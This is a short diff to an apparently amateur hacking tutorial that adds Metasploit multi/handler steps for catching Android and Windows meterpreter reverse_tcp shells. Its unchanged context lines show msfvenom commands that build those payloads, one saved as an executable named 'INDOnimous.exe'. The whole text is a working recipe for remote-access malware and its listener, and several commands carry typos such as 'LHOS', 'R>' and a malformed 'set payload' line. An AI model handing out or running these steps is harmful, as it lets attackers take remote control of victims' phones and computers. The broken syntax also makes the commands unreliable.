@@ -27,6 +27,21 @@ msfvenom -p android/meterpreter/reverse_tcp LHOS=(your IP/sah) LPORT=4444 R> /sd
 ``` fish
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your IP/sah) LPORT=4444 f> /desktop/INDOnimous.exe
 ```
+### Setting database Metasploit
+• Android 
+```fish
+1. use exploit/multi/handler 
+2. set payload/meterpreter/reverse_tcp
+3. set lhost (you ip/ssh)
+4. set lport 4444
+5. exploit
+```
 
-
-
+•• Windows
+```fish
+1. use exploit/multi/handler 
+2. set windows/meterpreter/reverse_tcp
+3. set lhost (you ip/ssh)
+4. set lport 4444
+5. exploit
+```
